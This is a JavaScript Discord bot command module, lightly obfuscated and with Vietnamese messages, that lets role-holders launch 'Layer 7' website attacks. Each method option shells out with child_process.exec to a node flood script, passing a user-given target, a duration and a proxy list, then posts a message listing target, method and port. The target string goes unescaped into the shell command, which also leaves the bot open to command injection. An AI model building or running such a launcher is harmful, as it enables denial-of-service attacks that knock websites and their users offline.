const {
    MessageEmbed
} = require('discord.js');
const ayarlar = require('../../ayarlar.json');
var version = ayarlar['versionbot'];
var roleID1 = ayarlar['roleID1'];
var commandroom = ayarlar['commandroom'];
var img = ayarlar['img'];
var photovip11 = ayarlar['photovip11'];
var randomgif = photovip11[Math['floor']((Math['random']() * photovip11['length']))];
module['exports'] = {
    name: 'attack',
    description: 'T\u1EA5n c\xF4ng trang Web ( Layer7 )',
    type: 'CHAT_INPUT',
    cooldown: 60,
    options: [{
        name: 'methods',
        description: 'Layer 7 ANIME',
        required: true,
        type: 'STRING',
        choices: [{
            name: `${'HTTPS-LOAD'}`,
            value: `${'HTTPS-LOAD'}`,
        }, {
            name: `${'HTTPS-MOD'}`,
            value: `${'HTTPS-MOD'}`,
        }, {
            name: `${'HTTPS-LEG'}`,
            value: `${'HTTPS-LEG'}`,

        }, {
            name: `${'HTTPS-BIG'}`,
            value: `${'HTTPS-BIG'}`,
        
        }, {
            name: `${'HTTP-LEAKED'}`,
            value: `${'HTTP-LEAKED'}`,
        }]
    }, {
        name: 'host',
        description: 'Nhap url website',
        required: true,
        type: 'STRING'
    }, {
        name: 'port',
        description: 'Nhap port',
        required: true,
        type: 'STRING'
    }, {
        name: 'time',
        description: 'Nhap time max 60s',
        required: true,
        type: 'STRING'
    }],
    run: async(_0xf396x7, _0xf396x8) => {
        if (!_0xf396x8['member']['roles']['cache']['has'](roleID1)) {
            return _0xf396x8['reply']({
                embeds: [new MessageEmbed()['setColor']('RANDOM')['setDescription'](`${'Ch\u1EC9 c\xF3 <@&'}${roleID1}${'> m\u1EDBi \u0111\u01B0\u1EE3c d\xF9ng l\u1EC7nh n\xE0y.'}`)['setFooter']({
                    text: '\xA9 Jubi#9999'
                })['setTimestamp']()]
            })
        };
        const _0xf396x9 = _0xf396x8['options']['getString']('methods');
        const _0xf396xa = _0xf396x8['options']['getString']('host');
        const _0xf396x4 = _0xf396x8['options']['getString']('time');
        const _0xf396x3 = _0xf396x8['options']['getString']('port');
            if (_0xf396x9 === 'HTTPS-YUE') {
            var _0xf396xb = _0xf396x9;
            var _0xf396xc = require('child_process')['exec'];
            _0xf396xc(`${'node beta/L7/'}${_0xf396xb}${'.js '}${_0xf396xa}${' 60 8 proxy.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
            console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                    name: '**`User:`**',
                value: `${' '}${_0xf396x8['user']['username']}${' '}`,
                inline: true
            }, {
                name: '**`Target:`**',
                value: `${' '}${_0xf396xa}${' '}`,
                inline: true
            }, {
                name: '**`Method:`**',
                value: `${' '}${_0xf396x9}${' '}`,
                inline: true
            }, {
                name: '**`Duration:`**',
                value: `${' '}${_0xf396x4}${' '}`,
                inline: true
            }, {
                name: '**`Port:`**',
                value: `${' '}${_0xf396x3}${' '}`,
                inline: true
            }, {
                name: '**`Mode:`**',
                value: `${' Layer7 '}`,
                inline: true
           })['setImage'](randomgif)['setFooter']('\xA9 Developer: gbao#3417|Trần Khánh Phương#8365', img)['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('WAITING...')['setImage']('https://i.pinimg.com/originals/86/c0/25/86c025297e8b557da4522d2b48cd1757.gif')['setFooter']('\xA9 Developer: Sagiko?', img)['setTimestamp']();
            _0xf396x8['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0xf396x8['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
            if (_0xf396x9 === 'HTTPS-BIG') {
            var _0xf396xb = _0xf396x9;
            var _0xf396xc = require('child_process')['exec'];
            _0xf396xc(`${'node beta/L7/'}${_0xf396xb}${'.js '}${_0xf396xa}${' 60 5 proxy.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
            console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                    name: '**`User:`**',
                value: `${' '}${_0xf396x8['user']['username']}${' '}`,
                inline: true
            }, {
                name: '**`Target:`**',
                value: `${' '}${_0xf396xa}${' '}`,
                inline: true
            }, {
                name: '**`Method:`**',
                value: `${' '}${_0xf396x9}${' '}`,
                inline: true
            }, {
                name: '**`Duration:`**',
                value: `${' '}${_0xf396x4}${' '}`,
                inline: true
            }, {
                name: '**`Port:`**',
                value: `${' '}${_0xf396x3}${' '}`,
                inline: true
            }, {
                name: '**`Mode:`**',
                value: `${' Layer7 '}`,
                inline: true
           })['setImage'](randomgif)['setFooter']('\xA9 Developer: gbao#3417|Trần Khánh Phương#8365', img)['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('WAITING...')['setImage']('https://i.pinimg.com/originals/86/c0/25/86c025297e8b557da4522d2b48cd1757.gif')['setFooter']('\xA9 Developer: Sagiko?', img)['setTimestamp']();
            _0xf396x8['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0xf396x8['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
            if (_0xf396x9 === 'HTTPS-LEG') {
            var _0xf396xb = _0xf396x9;
            var _0xf396xc = require('child_process')['exec'];
            _0xf396xc(`${'node beta/L7/'}${_0xf396xb}${'.js '}${_0xf396xa}${' 60 64 GET 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
            console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                    name: '**`User:`**',
                value: `${' '}${_0xf396x8['user']['username']}${' '}`,
                inline: true
            }, {
                name: '**`Target:`**',
                value: `${' '}${_0xf396xa}${' '}`,
                inline: true
            }, {
                name: '**`Method:`**',
                value: `${' '}${_0xf396x9}${' '}`,
                inline: true
            }, {
                name: '**`Duration:`**',
                value: `${' '}${_0xf396x4}${' '}`,
                inline: true
            }, {
                name: '**`Port:`**',
                value: `${' '}${_0xf396x3}${' '}`,
                inline: true
            }, {
                name: '**`Mode:`**',
                value: `${' Layer7 '}`,
                inline: true
           })['setImage'](randomgif)['setFooter']('\xA9 Developer: gbao#3417|Trần Khánh Phương#8365', img)['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('WAITING...')['setImage']('https://i.pinimg.com/originals/86/c0/25/86c025297e8b557da4522d2b48cd1757.gif')['setFooter']('\xA9 Developer: Sagiko?', img)['setTimestamp']();
            _0xf396x8['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0xf396x8['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
            if (_0xf396x9 === 'HTTPS-MOD') {
            var _0xf396xb = _0xf396x9;
            var _0xf396xc = require('child_process')['exec'];
            _0xf396xc(`${'node beta/L7/'}${_0xf396xb}${'.js GET '}${_0xf396xa}${' proxy.txt 60 120 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
            console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                    name: '**`User:`**',
                value: `${' '}${_0xf396x8['user']['username']}${' '}`,
                inline: true
            }, {
                name: '**`Target:`**',
                value: `${' '}${_0xf396xa}${' '}`,
                inline: true
            }, {
                name: '**`Method:`**',
                value: `${' '}${_0xf396x9}${' '}`,
                inline: true
            }, {
                name: '**`Duration:`**',
                value: `${' '}${_0xf396x4}${' '}`,
                inline: true
            }, {
                name: '**`Port:`**',
                value: `${' '}${_0xf396x3}${' '}`,
                inline: true
            }, {
                name: '**`Mode:`**',
                value: `${' Layer7 '}`,
                inline: true
           })['setImage'](randomgif)['setFooter']('\xA9 Developer: gbao#3417|Trần Khánh Phương#8365', img)['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('WAITING...')['setImage']('https://i.pinimg.com/originals/86/c0/25/86c025297e8b557da4522d2b48cd1757.gif')['setFooter']('\xA9 Developer: Sagiko?', img)['setTimestamp']();
            _0xf396x8['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0xf396x8['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
        if (_0xf396x9 === 'HTTP-LEAKED') {
        var _0xf396xb = _0xf396x9;
        var _0xf396xc = require('child_process')['exec'];
        _0xf396xc(`${'node beta/L7/'}${_0xf396xb}${'.js '}${_0xf396xa}${'60 120 5 proxy.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
        console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
        const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                name: '**`User:`**',
            value: `${' '}${_0xf396x8['user']['username']}${' '}`,
            inline: true
        }, {
            name: '**`Target:`**',
            value: `${' '}${_0xf396xa}${' '}`,
            inline: true
        }, {
            name: '**`Method:`**',
            value: `${' '}${_0xf396x9}${' '}`,
            inline: true
        }, {
            name: '**`Duration:`**',
            value: `${' '}${_0xf396x4}${' '}`,
            inline: true
        }, {
            name: '**`Port:`**',
            value: `${' '}${_0xf396x3}${' '}`,
            inline: true
        }, {
            name: '**`Mode:`**',
            value: `${' Layer7 '}`,
            inline: true
       })['setImage'](randomgif)['setFooter']('\xA9 Developer: gbao#3417|Trần Khánh Phương#8365', img)['setTimestamp']();
        const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('WAITING...')['setImage']('https://i.pinimg.com/originals/86/c0/25/86c025297e8b557da4522d2b48cd1757.gif')['setFooter']('\xA9 Developer: Sagiko?', img)['setTimestamp']();
        _0xf396x8['reply']({
            embeds: [_0xf396x11]
        })['then']((_0xf396x12) => {
            setTimeout(function () {
                _0xf396x8['editReply']({
                    embeds: [_0xf396x10]
                })
            }, 3000)
        })    
        }
            if (_0xf396x9 === 'HTTPS-LOAD') {
            var _0xf396xb = _0xf396x9;
            var _0xf396xc = require('child_process')['exec'];
            _0xf396xc(`${'node beta/L7/'}${_0xf396xb}${'.js GET '}${_0xf396xa}${' proxy.txt 60 120 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
            console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                    name: '**`User:`**',
                value: `${' '}${_0xf396x8['user']['username']}${' '}`,
                inline: true
            }, {
                name: '**`Target:`**',
                value: `${' '}${_0xf396xa}${' '}`,
                inline: true
            }, {
                name: '**`Method:`**',
                value: `${' '}${_0xf396x9}${' '}`,
                inline: true
            }, {
                name: '**`Duration:`**',
                value: `${' '}${_0xf396x4}${' '}`,
                inline: true
            }, {
                name: '**`Port:`**',
                value: `${' '}${_0xf396x3}${' '}`,
                inline: true
            }, {
                name: '**`Mode:`**',
                value: `${' Layer7 '}`,
                inline: true
            })['setImage'](randomgif)['setFooter']('\xA9 Developer: gbao#3417|Trần Khánh Phương#8365', img)['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('WAITING...')['setImage']('https://i.pinimg.com/originals/86/c0/25/86c025297e8b557da4522d2b48cd1757.gif')['setFooter']('\xA9 Developer: Sagiko?', img)['setTimestamp']();
            _0xf396x8['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0xf396x8['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
    }
}
